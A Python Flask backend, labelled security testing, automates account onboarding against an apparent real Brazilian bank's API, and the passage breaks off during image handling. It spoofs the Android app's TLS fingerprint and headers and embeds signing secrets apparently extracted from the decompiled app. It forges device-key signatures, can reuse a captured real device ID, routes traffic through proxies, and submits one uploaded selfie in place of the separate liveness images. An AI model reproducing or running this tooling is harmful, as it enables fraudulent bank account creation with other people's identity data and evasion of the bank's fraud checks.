"""
Dashboard de Onboarding - Frotabank Security Testing
Backend Flask com integracao manual + Frotabank API
"""
from flask import Flask, render_template, jsonify, request
import tls_client
import uuid
import json
import time
import jwt
import hashlib
import hmac as hmac_mod
import base64
import struct
import io
import re
import os
import traceback
from PIL import Image

app = Flask(__name__)
app.secret_key = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

STATE_FILE = os.path.join(os.path.dirname(__file__), ".state.json")

DEFAULT_STATE = {
    "session_id": None,
    "cpf": None,
    "phone": None,
    "person_data": None,
    "device_uuid": None,
    "device_id": None,
    "private_key": None,
    "uploaded_urls": {},
    "doc_type": "cnh-digital",
    "dk_validated": False,
    "steps_completed": [],
    "logs": [],
    "terms": [],
    "address": {},
    "proxy": None,
}


def _parse_proxy(raw):
    """Aceita 'ip:port:user:pass', 'ip:port', 'http://user:pass@ip:port'."""
    if not raw:
        return None
    raw = raw.strip()
    if raw.startswith("http://") or raw.startswith("https://") or raw.startswith("socks"):
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return raw


def _proxies_dict(raw=None):
    url = _parse_proxy(raw if raw is not None else state.get("proxy"))
    if not url:
        return None
    return {"http": url, "https": url}

def _load_state():
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            merged = dict(DEFAULT_STATE)
            merged.update(data)
            return merged
    except Exception as e:
        print(f"state load failed: {e}")
    return dict(DEFAULT_STATE)

def _save_state():
    try:
        snapshot = {k: v for k, v in state.items() if k != "logs"}
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(snapshot, f, default=str)
    except Exception as e:
        print(f"state save failed: {e}")

state = _load_state()

@app.after_request
def _persist_state(response):
    if request.path.startswith("/api/") and request.path != "/api/logs":
        _save_state()
    return response

FROTABANK = {
    "base": "https://api.c03.frotabank.com.br",
    "sg_api_key": "624ec48b-4ad7-4367-afd9-294a7f7e8c53",
    "sg_url": "https://id.c03.frotabank.com.br/",
    "pinning_secret": "AjJzVnKqL16dYKEbrKyIefbQge4uXRpnnZucf",
    "pinning_issuer": "frotabank",
    "unico_host_key": "7bbc34af2d387f668bc324a9d002c34776f6dd8ec3c4cdcacd0eb7ca8b5a1ed0",
    "unico_host_info": "Up4XTo9Enmc9krxVWOW2KkDIHFlJDv6AXGgf547UEGA=",
    "unico_project_number": "5801520184969284218619",
    "unico_project_id": "Frotabank App",
    "unico_mobile_sdk_app_id": "1:327120:android",
    "unico_bundle_id": "br.com.frotabank.app",
}


def add_log(msg, level="info", tag=None):
    """
    level: info | success | error | warn | debug
    tag:   CPF | PRE | PHONE | CODE | USER | UPLOAD | DK | DOCS | AUTH | HTTP
    """
    now = time.time()
    sid_received = state.get("session_received_at")
    sid_age = f"+{int(now - sid_received)}s" if sid_received else ""
    tag_str = f"[{tag}]" if tag else ""
    entry = {
        "time": time.strftime("%H:%M:%S"),
        "msg": msg,
        "level": level,
        "tag": tag or "",
        "sid_age": sid_age,
    }
    state["logs"].append(entry)
    if len(state["logs"]) > 300:
        state["logs"] = state["logs"][-300:]
    print(f"[{entry['time']}] {tag_str:7} {sid_age:6} [{level}] {msg}")


def reset_state(use_known_device=False):
    """use_known_device=True usa o device_id/uuid capturado do app real (teste de fingerprint)."""
    if use_known_device:
        duid = "30f4a86b945e79c8"
        duuid = "81476739-bf8b-401c-9e31-f264cc6c0f3b"
    else:
        duid = uuid.uuid4().hex[:16]
        duuid = str(uuid.uuid4())
    state.update({
        "session_id": None,
        "cpf": None,
        "phone": None,
        "person_data": None,
        "device_uuid": duuid,
        "device_id": duid,
        "private_key": None,
        "uploaded_urls": {},
        "doc_type": "cnh-digital",
        "dk_validated": False,
        "steps_completed": [],
        "logs": [],
        "terms": [],
        "address": {},
    })
    try:
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
    except Exception:
        pass


_raw_http = tls_client.Session(
    client_identifier="okhttp4_android_13", random_tls_extension_order=True
)


class _HttpProxy:
    """Wrapper em torno do tls_client.Session que injeta proxy automaticamente."""
    def __init__(self, session):
        self._s = session

    def _inject(self, kwargs):
        p = _parse_proxy(state.get("proxy"))
        if p and "proxy" not in kwargs:
            kwargs["proxy"] = p
        return kwargs

    def get(self, url, **kw):    return self._s.get(url, **self._inject(kw))
    def post(self, url, **kw):   return self._s.post(url, **self._inject(kw))
    def put(self, url, **kw):    return self._s.put(url, **self._inject(kw))
    def delete(self, url, **kw): return self._s.delete(url, **self._inject(kw))
    def patch(self, url, **kw):  return self._s.patch(url, **self._inject(kw))
    def options(self, url, **kw):return self._s.options(url, **self._inject(kw))
    def head(self, url, **kw):   return self._s.head(url, **self._inject(kw))

    def __getattr__(self, name):
        return getattr(self._s, name)


http = _HttpProxy(_raw_http)
CORR = uuid.uuid4().hex


def pinning_token():
    return jwt.encode(
        {"iss": FROTABANK["pinning_issuer"], "iat": int(time.time())},
        FROTABANK["pinning_secret"],
        algorithm="HS256",
    )


def traverse(obj, parent_keys=None, result=None):
    if parent_keys is None:
        parent_keys = []
    if result is None:
        result = []
    if obj is None:
        return result
    for key in obj:
        val = obj[key]
        if val is None:
            continue
        path = parent_keys + [str(key)]
        if isinstance(val, dict):
            traverse(val, path, result)
        elif isinstance(val, list):
            for i, item in enumerate(val):
                if isinstance(item, dict):
                    traverse(item, path + [str(i)], result)
                elif item is not None:
                    result.append(f"{'.'.join(path + [str(i)])}={item}")
        elif isinstance(val, bool):
            result.append(f"{'.'.join(path)}={'true' if val else 'false'}")
        else:
            result.append(f"{'.'.join(path)}={val}")
    return result


def generate_param_string(obj):
    entries = traverse(obj)
    entries.sort()
    return "\n".join(entries)


def generate_case_insensitive_param_string(obj):
    entries = traverse(obj)
    lowered = []
    for entry in entries:
        idx = entry.index("=")
        lowered.append(entry[:idx].lower() + entry[idx:])
    lowered.sort()
    return "\n".join(lowered)


def build_canonical_string(method, domain, path, body=None, query=None, headers=None):
    if headers:
        headers = {k: v for k, v in headers.items() if k.lower() != "sg-signature"}
    parts = [method.upper(), domain.lower(), path]
    if query and len(query) > 0:
        parts.append(generate_param_string(query))
    if body and len(body) > 0:
        parts.append(generate_param_string(body))
    if headers and len(headers) > 0:
        parts.append(generate_case_insensitive_param_string(headers))
    return "\n".join(parts)


def device_key_signature(method, path, body=None, query=None, config_headers=None):
    pk = state["private_key"]
    if not pk:
        return None, None, None
    domain = "api.c03.frotabank.com.br"
    canonical = build_canonical_string(method, domain, path, body, query, config_headers)
    sha1_hex = hashlib.sha1(canonical.encode("utf-8")).hexdigest()
    hmac_hex = hmac_mod.new(
        pk.encode("utf-8"), sha1_hex.encode("utf-8"), hashlib.sha256
    ).hexdigest()
    did = state["device_id"]
    duu = state["device_uuid"]
    sig_raw = f"{FROTABANK['sg_api_key']}:{did}:{duu}:{sha1_hex}:{hmac_hex}"
    signature = base64.b64encode(sig_raw.encode("utf-8")).decode("utf-8")
    existing_keys = ";".join(config_headers.keys()) if config_headers else ""
    # DEBUG: dump canonical pra arquivo
    try:
        with open(os.path.join(os.path.dirname(__file__), ".last_canonical.txt"), "w", encoding="utf-8") as f:
            f.write(f"=== CANONICAL ({path}) ===\n{canonical}\n")
            f.write(f"\n=== DIGESTS ===\nsha1: {sha1_hex}\nhmac: {hmac_hex}\n")
            f.write(f"pk: {pk}\ndid: {did}\nduu: {duu}\n")
    except Exception:
        pass
    return signature, existing_keys, state["cpf"]


def base_http_headers(sid=None):
    global CORR
    hh = {
        "accept": "application/json, text/plain, */*",
        "x-app-name": "br.com.frotabank.app",
        "x-app-platform": "android",
        "x-app-finger-print": state["device_id"] or "0000000000000000",
        "x-app-build-number": "2026012801",
        "x-app-version": "18.10.18",
        "x-app-device-model": "ROG / ROG Phone 7 Ultimate / star2qltechn / qcom",
        "x-correlation-id": CORR,
        "content-type": "application/json",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/4.11.0",
        # Pinning JWT - bankingCoreHttpClient adiciona em TODA request (decompiled.js:567961 setPinningHeaderOnRequest)
        "sg-signature": pinning_token(),
    }
    if sid:
        hh["sessionid"] = sid
    return hh


def h_simple(sid=None):
    return base_http_headers(sid)


def h_with_dk(sid=None, method=None, path=None, body=None, config_headers=None):
    base = base_http_headers(sid)
    if state["private_key"] and method and path:
        hmac_hdrs = dict(config_headers) if config_headers else {}
        sig, hdrs, uid = device_key_signature(method, path, body, config_headers=hmac_hdrs)
        if sig:
            base["x-device-key-signature"] = sig
            if uid:
                base["x-device-key-user-id"] = uid
    if config_headers:
        for k, v in config_headers.items():
            base[k] = v
    return base


def make_multipart_body(file_data, filename="doc.pdf"):
    boundary = str(uuid.uuid4())
    ext = (filename.rsplit(".", 1)[-1] if "." in filename else "").lower()
    ct_map = {"pdf": "application/pdf", "jpg": "image/jpeg", "jpeg": "image/jpeg", "png": "image/png"}
    ct = ct_map.get(ext, "application/octet-stream")
    body = io.BytesIO()
    body.write(f"--{boundary}\r\n".encode())
    body.write(f'content-disposition: form-data; name="file"; filename="{filename}"\r\n'.encode())
    body.write(f"Content-Type: {ct}\r\n".encode())
    body.write(f"Content-Length: {len(file_data)}\r\n\r\n".encode())
    body.write(file_data)
    body.write(f"\r\n--{boundary}--\r\n".encode())
    return body.getvalue(), f"multipart/form-data; boundary={boundary}"


def to_iso(val):
    if not val:
        return ""
    if "T" in val:
        return val
    parts = val.strip().split("/")
    if len(parts) == 3:
        dd, mm, yyyy = parts
        return f"{yyyy}-{mm}-{dd}T03:00:00.000Z"
    if "-" in val and len(val) == 10:
        return f"{val}T03:00:00.000Z"
    return val


def _term_type_to_api(t):
    """Converte CamelCase do GET /v2/terms para UPPER_SNAKE_CASE do POST /user."""
    mapping = {
        "TermsOfUse": "TERMS_OF_USE",
        "PrivacyPolicy": "PRIVACY_POLICY",
    }
    return mapping.get(t, t)


def _ensure_device_key():
    """Cria device key no SafeGuard se ainda nao existe. Retorna (ok, error_msg)."""
    if state.get("private_key"):
        add_log("Device key ja existe (cache)", "debug", tag="DK")
        return True, None
    cpf = state.get("cpf")
    if not cpf:
        return False, "CPF ausente"
    add_log("Criando device key no SafeGuard...", tag="DK")
    r = http.post(
        f"{FROTABANK['sg_url']}device_key",
        json={
            "deviceId": state["device_id"],
            "isRoot": False,
            "userId": cpf,
            "uuid": state["device_uuid"],
            "operatingSystem": "Android",
        },
        headers={
            "accept": "application/json, text/plain, */*",
            "sg-api-key": FROTABANK["sg_api_key"],
            "content-type": "application/json;charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0",
        },
        timeout_seconds=15,
    )
    if r.status_code in (200, 201):
        dk = r.json()
        state["private_key"] = dk.get("privateKey", "")
        add_log(f"Device key criada: {state['private_key'][:8]}...", "success", tag="DK")
        return True, None
    add_log(f"Device key falhou: {r.status_code} {r.text[:200]}", "error", tag="DK")
    return False, f"device_key {r.status_code}: {r.text[:200]}"


def _build_documents_array():
    urls = state.get("uploaded_urls", {})
    doc_type = state.get("doc_type", "cnh-digital")
    docs = []

    if doc_type == "cnh-digital":
        cnh = urls.get("cnhDigital")
        if cnh:
            docs.append({"url": cnh, "documentType": "DIGITAL_DRIVER_LICENSE"})
    elif doc_type == "cnh-fisica":
        front = urls.get("cnhFront")
        back = urls.get("cnhBack")
        if front:
            docs.append({"url": front, "documentType": "DRIVER_LICENSE_FRONT"})
        if back:
            docs.append({"url": back, "documentType": "DRIVER_LICENSE_BACK"})
    else:  # rg
        front = urls.get("rgFront")
        back = urls.get("rgBack")
        if front:
            docs.append({"url": front, "documentType": "RG_FRONT"})
        if back:
            docs.append({"url": back, "documentType": "RG_BACK"})

    selfie_url = urls.get("selfie")
    if selfie_url:
        if isinstance(selfie_url, dict):
            docs.append({"url": selfie_url, "documentType": "SELFIE"})
        elif isinstance(selfie_url, str):
            # Multipart upload retorna uma URL unica (nao liveness). Duplica a mesma pra base64Url + encryptedUrl.
            # No fluxo liveness real sao URLs distintas, mas aqui apontam pro mesmo arquivo.
            docs.append({"url": {"base64Url": selfie_url, "encryptedUrl": selfie_url}, "documentType": "SELFIE"})
    return docs


# ============================================================
# Routes
# ============================================================

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/onboard/reset", methods=["POST"])
def onboard_reset():
    use_known = (request.json or {}).get("use_known_device", False)
    reset_state(use_known_device=use_known)
    global CORR, http, _raw_http
    CORR = uuid.uuid4().hex
    _raw_http = tls_client.Session(
        client_identifier="okhttp4_android_13", random_tls_extension_order=True
    )
    http = _HttpProxy(_raw_http)
    add_log(f"Sessao resetada (device: {'known-real' if use_known else 'random'})")
    return jsonify({"ok": True, "device_id": state["device_id"]})


@app.route("/api/onboard/check-cpf", methods=["POST"])
def onboard_check_cpf():
    cpf = re.sub(r"\D", "", request.json.get("cpf", ""))
    if len(cpf) != 11:
        return jsonify({"ok": False, "msg": "CPF invalido"}), 400

    # Validate CPF checksum
    def valid_cpf(c):
        if len(set(c)) == 1:
            return False
        for i in range(2):
            digits = c[:9+i]
            s = sum((10+i-j)*int(d) for j,d in enumerate(digits))
            r = 11 - (s % 11)
            if r >= 10:
                r = 0
            if int(c[9+i]) != r:
                return False
        return True

    if not valid_cpf(cpf):
        add_log(f"CPF invalido (checksum)", "error")
        return jsonify({"ok": False, "msg": "CPF invalido (checksum)"}), 400

    state["cpf"] = cpf
    add_log(f"CPF {cpf[:3]}...{cpf[-2:]} checksum OK", tag="CPF")
    add_log("Validando documento...", tag="CPF")
    r_val = http.get(
        f"{FROTABANK['base']}/v2/whitelist/validate-document/{cpf}",
        headers=h_simple(),
    )
    add_log(f"validate-document: {r_val.status_code}", tag="CPF", level="debug")

    if r_val.status_code == 404:
        add_log("CPF disponivel para cadastro", "success", tag="CPF")
        return jsonify({"ok": True, "cpf_state": "new_account", "status": "not_found"})

    if r_val.status_code == 401:
        add_log("CPF bloqueado", "error", tag="CPF")
        return jsonify({"ok": True, "cpf_state": "blocked", "status": "blocked"})

    add_log("Verificando credenciais...", tag="CPF")
    r_cred = http.post(
        f"{FROTABANK['base']}/v2/credentials/exists",
        json={"document": cpf},
        headers=h_simple(),
    )
    cred_body = {}
    try:
        cred_body = r_cred.json()
    except Exception:
        pass
    add_log(f"credentials/exists: {r_cred.status_code}", tag="CPF", level="debug")

    cred_error = ""
    if isinstance(cred_body, dict):
        cred_error = cred_body.get("error", {}).get("code", "") if isinstance(cred_body.get("error"), dict) else cred_body.get("code", "")

    if r_cred.status_code in (200, 201, 204) and cred_error != "credentials_not_found":
        add_log("CPF tem conta ativa — login", "warn", tag="CPF")
        return jsonify({"ok": True, "cpf_state": "has_account", "status": "has_credential"})

    if cred_error == "credentials_not_found" or r_cred.status_code in (404, 400):
        add_log("CPF cadastro incompleto — criar senha", "warn", tag="CPF")
        return jsonify({"ok": True, "cpf_state": "in_progress", "status": "credentials_not_found"})

    add_log("CPF tem conta (fallback)", "warn", tag="CPF")
    return jsonify({"ok": True, "cpf_state": "has_account", "status": f"assumed_{r_cred.status_code}"})


@app.route("/api/onboard/save-person", methods=["POST"])
def save_person():
    data = request.json
    state["person_data"] = {
        "name": data.get("name", "").strip().upper(),
        "birthday": data.get("birthday", ""),
        "motherName": data.get("motherName", "").strip().upper(),
        "email": data.get("email", "").strip().lower(),
        "rg": data.get("rg", "").strip(),
        "rgIssuingDate": data.get("rgIssuingDate", ""),
        "monthlyIncome": data.get("monthlyIncome", 5000),
        "isPEP": data.get("isPEP", False),
        "gender": data.get("gender", ""),
        "zipCode": data.get("zipCode", ""),
        "street": data.get("street", ""),
        "number": data.get("number", ""),
        "complement": data.get("complement", ""),
        "neighborhood": data.get("neighborhood", ""),
        "city": data.get("city", ""),
        "state": data.get("state", ""),
    }
    state["cpf"] = re.sub(r"\D", "", data.get("cpf", ""))
    add_log(f"Dados salvos: {state['person_data']['name'][:30]}", "success", tag="DATA")
    return jsonify({"ok": True})


@app.route("/api/onboard/lookup-cep", methods=["POST"])
def lookup_cep():
    cep = re.sub(r"\D", "", request.json.get("cep", ""))
    if len(cep) != 8:
        return jsonify({"ok": False, "msg": "CEP invalido"}), 400
    add_log(f"Buscando CEP {cep}", tag="CEP")
    r = http.get(f"{FROTABANK['base']}/zipcode/{cep}", headers=h_simple())
    if r.status_code == 200:
        data = r.json()
        add_log(f"CEP OK: {data.get('street', '')}", "success", tag="CEP")
        return jsonify({"ok": True, "address": data})
    add_log(f"CEP nao encontrado ({r.status_code})", "error", tag="CEP")
    return jsonify({"ok": False, "msg": f"CEP nao encontrado ({r.status_code})"}), 404


# Mapeia nomes amigaveis do frontend pros valores reais da API
# Linha 881623-881631 do decompiled.js: VerificationCodeDeliveryMethods
# UI "SMS" => API "phone" (nao existe valor "sms" na API)
DELIVERY_MAP = {
    "sms": "phone",
    "phone": "phone",
    "whatsapp": "whatsapp",
    "email": "email",
    "phone-call": "phone-call",
    "phoneCall": "phone-call",
}


@app.route("/api/onboard/start", methods=["POST"])
def onboard_start():
    data = request.json
    cpf = re.sub(r"\D", "", data.get("cpf", ""))
    phone = re.sub(r"\D", "", data.get("phone", ""))
    delivery_raw = data.get("deliveryMethod", "whatsapp")
    delivery = DELIVERY_MAP.get(delivery_raw, "whatsapp")

    if not cpf or not phone:
        return jsonify({"ok": False, "msg": "CPF e telefone obrigatorios"}), 400

    state["cpf"] = cpf
    state["phone"] = phone
    if not state["device_uuid"]:
        state["device_uuid"] = str(uuid.uuid4())
        state["device_id"] = uuid.uuid4().hex[:16]

    add_log(f"Enviando codigo para {phone} via {delivery_raw}", tag="PHONE")

    url = f"{FROTABANK['base']}/v2/verification-code/send"
    body = {
        "verificationCodeType": "onboarding",
        "phone": phone,
        "deliveryMethod": delivery,
    }
    r = None
    last_err = None
    for attempt in range(1, 3):
        try:
            r = http.post(url, json=body, headers=h_simple(), timeout_seconds=15)
            break
        except Exception as e:
            last_err = str(e)[:200]
            add_log(f"Timeout tentativa {attempt}: {last_err}", "warn", tag="PHONE")
    if r is None:
        add_log(f"Falha total envio codigo: {last_err}", "error", tag="PHONE")
        return jsonify({"ok": False, "msg": f"Timeout/erro de rede: {last_err}"}), 504

    if r.status_code == 200:
        add_log(f"Codigo enviado via {delivery_raw}", "success", tag="PHONE")
        state["steps_completed"].append("code_sent")
        return jsonify({"ok": True, "msg": f"Codigo enviado via {delivery_raw}"})
    else:
        add_log(f"Falha envio: {r.status_code} {r.text[:150]}", "error", tag="PHONE")
        return jsonify({"ok": False, "msg": r.text[:300], "status": r.status_code}), 400


@app.route("/api/onboard/verify-phone", methods=["POST"])
def onboard_verify_phone():
    code = request.json.get("code", "").strip()
    if not code:
        return jsonify({"ok": False, "msg": "Codigo obrigatorio"}), 400

    add_log(f"Verificando codigo", tag="CODE")

    r = http.post(
        f"{FROTABANK['base']}/phone/confirmation",
        json={"phone": state["phone"], "verificationCode": code},
        headers=h_simple(),
        timeout_seconds=45,
    )

    if r.status_code == 200:
        data = r.json()
        sid = data.get("sessionId", "")
        if sid:
            state["session_id"] = sid
            state["session_received_at"] = time.time()
            state["steps_completed"].append("phone_verified")
            add_log(f"Codigo verificado, sessionId obtido ({sid[:8]}...)", "success", tag="CODE")

            # App real chama /user/cpf-validation logo apos obter sessionid (step #7)
            try:
                rv = http.post(
                    f"{FROTABANK['base']}/user/cpf-validation",
                    json={"cpf": state["cpf"]},
                    headers=h_simple(sid),
                    timeout_seconds=15,
                )
                add_log(f"cpf-validation: {rv.status_code}", tag="CODE", level="debug")
            except Exception as e:
                add_log(f"cpf-validation falhou: {str(e)[:80]}", "warn", tag="CODE")

            return jsonify({"ok": True, "sessionId": sid[:20] + "..."})

    add_log(f"Verificacao falhou: {r.status_code} {r.text[:150]}", "error", tag="CODE")
    return jsonify({"ok": False, "msg": r.text[:300]}), 400


@app.route("/api/onboard/verify-and-create", methods=["POST"])
def onboard_verify_and_create():
    """
    Faz verify-phone + POST /user em UMA UNICA chamada backend.
    Elimina round-trip HTTP intermediario — delay fica em <2s.
    Resolve timing do sessionId curto.
    """
    data = request.json or {}
    code = data.get("code", "").strip()
    password = data.get("password", "")

    if not code:
        return jsonify({"ok": False, "msg": "Codigo obrigatorio"}), 400
    if not password:
        return jsonify({"ok": False, "msg": "Senha obrigatoria"}), 400

    # 1. Verifica codigo e obtem sessionId
    add_log("Verificando codigo + criando conta em UMA chamada", tag="CODE")
    t0 = time.time()
    r_verify = http.post(
        f"{FROTABANK['base']}/phone/confirmation",
        json={"phone": state["phone"], "verificationCode": code},
        headers=h_simple(),
        timeout_seconds=45,
    )
    t_verify = time.time() - t0
    add_log(f"verify-phone: {r_verify.status_code} em {t_verify:.2f}s", tag="CODE")

    if r_verify.status_code != 200:
        return jsonify({"ok": False, "msg": r_verify.text[:300], "stage": "verify"}), 400

    sid = r_verify.json().get("sessionId", "")
    if not sid:
        return jsonify({"ok": False, "msg": "sessionId nao retornado"}), 400

    state["session_id"] = sid
    state["session_received_at"] = time.time()
    state["steps_completed"].append("phone_verified")
    add_log(f"SessionId obtido ({sid[:8]}...)", "success", tag="CODE")

    # 2. CPF validation (app real faz isso logo apos sessionId)
    try:
        http.post(f"{FROTABANK['base']}/user/cpf-validation", json={"cpf": state["cpf"]}, headers=h_simple(sid), timeout_seconds=10)
    except Exception:
        pass

    # 3. Cria device key no SafeGuard (obrigatorio antes de POST /user)
    dk_ok, dk_err = _ensure_device_key()
    if not dk_ok:
        add_log(f"Device key falhou, tentando POST /user sem DK: {dk_err}", "warn", tag="DK")

    # 4. Monta payload e dispara POST /user
    person = state.get("person_data") or {}
    addr = state.get("address") or {}

    payload = {
        "addresses": [{
            "zipCode": re.sub(r"\D", "", person.get("zipCode", "80420000")),
            "street": person.get("street") or addr.get("street", "Rua Exemplo"),
            "number": person.get("number", "100"),
            "complement": person.get("complement", ""),
            "neighborhood": person.get("neighborhood") or addr.get("neighborhood", "Centro"),
            "city": person.get("city") or addr.get("city", "Curitiba"),
            "state": person.get("state") or addr.get("state", "PR"),
        }],
        "birthday": to_iso(person.get("birthday", "01/01/1990")),
        "documentNumber": state["cpf"],
        "email": person.get("email", f"test{state['cpf'][:6]}@gmail.com"),
        "name": person.get("name", "TESTE USUARIO"),
        "password": password,
        "phone": state["phone"],
        "terms": state.get("terms", []),
        "isPEP": person.get("isPEP", False),
        "monthlyIncome": int(person.get("monthlyIncome", 5000)),
        "motherName": person.get("motherName", "MAE TESTE"),
        "professionId": 1,
        "type": "person",
        "partners": [],
        "deviceKeyInstallation": {
            "uuid": state["device_uuid"],
            "deviceId": state["device_id"],
        },
        "rg": person.get("rg", "000000000"),
        "rgIssuingDate": to_iso(person.get("rgIssuingDate", "14/10/2022")),
        "documents": _build_documents_array(),
    }

    headers = h_with_dk(sid=sid, method="POST", path="/user", body=payload, config_headers={})
    t1 = time.time()
    add_log(f"POST /user disparado +{int(t1-state['session_received_at'])}s apos sessionId", tag="USER")

    r_user = http.post(f"{FROTABANK['base']}/user", json=payload, headers=headers, timeout_seconds=30)
    t_user = time.time() - t1
    add_log(f"POST /user: {r_user.status_code} em {t_user:.2f}s", tag="USER",
            level="success" if r_user.status_code in (200, 201) else "error")

    if r_user.status_code in (200, 201):
        state["steps_completed"].append("user_created")
        add_log(f"CONTA CRIADA! Total: {t_verify + t_user:.2f}s", "success", tag="USER")
        return jsonify({"ok": True, "response": r_user.json() if r_user.text else {}, "timing": {"verify": t_verify, "user": t_user}})

    # Analisa o erro
    err_code = ""
    try:
        err_code = r_user.json().get("error", {}).get("code", "")
    except Exception:
        pass

    add_log(f"POST /user falhou: {err_code or r_user.text[:200]}", "error", tag="USER")
    return jsonify({
        "ok": False,
        "status": r_user.status_code,
        "msg": r_user.text[:500],
        "error_code": err_code,
        "timing": {"verify": t_verify, "user": t_user},
        "stage": "create_user",
    }), 400


@app.route("/api/onboard/cpf-check-state", methods=["POST"])
def cpf_check_state():
    sid = state["session_id"]
    cpf = state["cpf"]
    if not sid:
        return jsonify({"ok": False, "msg": "Sem sessionId"}), 400

    add_log("Verificando estado do CPF...")
    r = http.post(f"{FROTABANK['base']}/user/cpf-validation", json={"cpf": cpf}, headers=h_simple(sid))
    cpf_body = {}
    try:
        cpf_body = r.json()
    except Exception:
        pass
    cpf_error_code = ""
    if isinstance(cpf_body, dict):
        cpf_error_code = cpf_body.get("error", {}).get("code", "")
    add_log(f"CPF validation: {r.status_code} {cpf_error_code or ''}")

    if cpf_error_code == "BANK_API_USER_DOCUMENT_ALREADY_EXISTS":
        add_log("CPF JA POSSUI CONTA!", "warn")
        return jsonify({"ok": True, "cpf_state": "has_account"})

    add_log("CPF disponivel para cadastro", "success")
    return jsonify({"ok": True, "cpf_state": "new_account"})


@app.route("/api/onboard/pre-setup", methods=["POST"])
def onboard_pre_setup():
    """Garante device_uuid/device_id. Device key eh criada DEPOIS do upload (step Criar Conta)
    para seguir o fluxo real do app (ver FLUXO_CAPTURADO_COMPLETO.md step #13)."""
    cpf = state["cpf"]
    if not cpf:
        return jsonify({"ok": False, "msg": "CPF ausente"}), 400

    if not state.get("device_uuid"):
        state["device_uuid"] = str(uuid.uuid4())
        state["device_id"] = uuid.uuid4().hex[:16]
        add_log(f"Device UUID/ID gerados: {state['device_id']}", tag="PRE", level="debug")

    results = {"device_key": "deferred_to_create_step"}

    # Chamadas de startup que o app faz ANTES de tudo - registram device_id no backend
    add_log("Startup: /v2/application/versions + /time (registra device)", tag="PRE")
    try:
        http.get(f"{FROTABANK['base']}/v2/application/versions", headers=h_simple(), timeout_seconds=10)
        http.get(f"{FROTABANK['base']}/v2/application/time", headers=h_simple(), timeout_seconds=10)
        results["startup"] = "ok"
    except Exception as e:
        add_log(f"Startup falhou: {str(e)[:80]}", "warn", tag="PRE")
        results["startup"] = "err"

    add_log("Pre-setup: buscando termos (device_key sera no step Criar Conta)", tag="PRE")
    r = http.get(
        f"{FROTABANK['base']}/v2/terms?types[]=TermsOfUse&types[]=PrivacyPolicy",
        headers=h_simple(),
    )
    if r.status_code == 200:
        terms = r.json()
        state["terms"] = [{"type": _term_type_to_api(t["type"]), "token": t["token"]} for t in terms]
        add_log(f"Termos OK ({len(state['terms'])})", tag="PRE")
        results["terms"] = "ok"
    else:
        add_log(f"Termos: HTTP {r.status_code}", "warn", tag="PRE")
        results["terms"] = f"status:{r.status_code}"

    state["steps_completed"].append("pre_setup_done")
    return jsonify({"ok": True, "results": results})


@app.route("/api/onboard/_old_pre_setup_disabled", methods=["POST"])
def _old_pre_setup():
    cpf = state["cpf"]
    if not cpf:
        return jsonify({"ok": False, "msg": "CPF ausente"}), 400
    results = {}
    add_log("Criando device key no SafeGuard", tag="PRE")
    r = http.post(
        f"{FROTABANK['sg_url']}device_key",
        json={
            "deviceId": state["device_id"],
            "isRoot": False,
            "userId": cpf,
            "uuid": state["device_uuid"],
            "operatingSystem": "Android",
        },
        headers={
            "accept": "application/json, text/plain, */*",
            "sg-api-key": FROTABANK["sg_api_key"],
            "content-type": "application/json;charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0",
        },
    )
    if r.status_code in (200, 201):
        dk = r.json()
        state["private_key"] = dk.get("privateKey", "")
        add_log("Device key criada", "success", tag="PRE")
        results["device_key"] = "ok"
    else:
        add_log(f"Device key falhou: {r.text[:150]}", "error", tag="PRE")
        results["device_key"] = f"error: {r.status_code}"

    state["steps_completed"].append("pre_setup_done")
    return jsonify({"ok": True, "results": results})


@app.route("/api/onboard/setup", methods=["POST"])
def onboard_setup():
    """Setup completo (fallback) — usa sessionId pra buscar termos se pre-setup nao buscou."""
    sid = state["session_id"]
    cpf = state["cpf"]

    results = {}

    if not state.get("terms"):
        add_log("Buscando termos (fallback - sem cache)", tag="SETUP")
        r = http.get(
            f"{FROTABANK['base']}/v2/terms?types[]=TermsOfUse&types[]=PrivacyPolicy",
            headers=h_simple(sid),
        )
        if r.status_code == 200:
            terms = r.json()
            state["terms"] = [{"type": _term_type_to_api(t["type"]), "token": t["token"]} for t in terms]
            add_log(f"Termos OK ({len(state['terms'])})", tag="SETUP")
        results["terms"] = r.status_code
    else:
        add_log(f"Termos cache ({len(state['terms'])})", tag="SETUP", level="debug")
        results["terms"] = "cached"

    dk_ok, dk_err = _ensure_device_key()
    results["device_key"] = "ok" if dk_ok else f"error: {dk_err}"

    state["steps_completed"].append("setup_done")
    return jsonify({"ok": True, "results": results})


@app.route("/api/onboard/upload", methods=["POST"])
def onboard_upload():
    sid = state["session_id"]
    if not sid:
        return jsonify({"ok": False, "msg": "Sem sessionId"}), 400

    doc_type = request.form.get("docType", "cnh-digital")
    state["doc_type"] = doc_type
    add_log(f"Tipo de documento: {doc_type}", tag="UPLOAD")

    if doc_type == "cnh-digital":
        fields = ["selfie", "cnhDigital"]
    elif doc_type == "cnh-fisica":
        fields = ["selfie", "cnhFront", "cnhBack"]
    else:
        fields = ["selfie", "rgFront", "rgBack"]

    results = {}

    for field_name in fields:
        f = request.files.get(field_name)
        if not f:
            add_log(f"{field_name}: arquivo nao enviado", "error")
            results[field_name] = {"ok": False, "msg": "Arquivo nao enviado"}
            continue

        file_data = f.read()
        is_pdf = (f.filename or "").lower().endswith(".pdf") or field_name == "cnhDigital"
        is_selfie = field_name == "selfie" and not is_pdf

        if not is_pdf and len(file_data) > 400_000:
            try:
                img = Image.open(io.BytesIO(file_data))
                if img.mode == "RGBA":
                    img = img.convert("RGB")
                max_dim = 1920
                if max(img.size) > max_dim:
                    img.thumbnail((max_dim, max_dim), Image.LANCZOS)
                target_kb = 500
                quality = 95
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=quality, optimize=True)
